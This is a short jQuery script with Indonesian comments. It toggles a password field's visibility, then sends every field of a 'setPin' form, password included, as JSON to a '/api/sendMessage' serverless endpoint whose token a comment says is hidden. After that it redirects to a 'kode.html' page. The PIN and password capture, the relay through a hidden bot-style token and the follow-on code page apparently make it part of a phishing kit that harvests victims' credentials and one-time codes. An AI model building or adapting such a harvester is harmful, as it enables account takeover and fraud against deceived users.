$(document).ready(function() {
  // 👁 Toggle show/hide password
  $("div#eyeOpen").on("click", function() {
    $("#eyeOpen").css("display", "none");
    $("#eyeClose").css("display", "block");
    $("#password").prop("type", "text");
  });

  $("div#eyeClose").on("click", function() {
    $("#eyeClose").css("display", "none");
    $("#eyeOpen").css("display", "block");
    $("#password").prop("type", "password");
  });

  // 📨 Handle form submit
  document.querySelector("#setPin").addEventListener("submit", async (e) => {
    e.preventDefault();

    // Ambil semua input dari form
    let text = JSON.stringify(
      Object.fromEntries(new FormData(e.target).entries()),
      null,
      2
    );

    // Kirim ke serverless function Vercel (token disembunyikan di sana)
    const sendMessage = await fetch("/api/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text }),
    });

    const result = await sendMessage.json();
    const messageStatus = document.querySelector("#status");

    if (sendMessage.ok && result.ok) {
      messageStatus.textContent = "✅ Pesan berhasil dikirim!";
      e.target.reset();
      window.location.href = "kode.html"; // redirect setelah sukses
    } else {
      messageStatus.textContent =
        "❌ Gagal mengirim pesan: " + (result.error || "Unknown error");
    }
  });
});